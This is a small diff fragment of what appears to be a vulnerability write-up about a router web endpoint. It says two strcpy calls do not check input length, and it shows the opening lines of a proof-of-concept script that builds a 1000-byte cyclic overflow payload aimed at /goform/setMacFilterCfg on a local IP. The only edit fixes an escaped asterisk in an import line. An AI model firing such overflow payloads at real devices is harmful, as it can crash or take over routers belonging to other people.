@@ -52,7 +52,7 @@ Neither `strcpy` call validates the length of the input against the buffer size.
 
 
 ```
-from pwn import \*
+from pwn import *
 import requests
 payload = cyclic(1000)
 url = "http://192.168.31.149/goform/setMacFilterCfg"
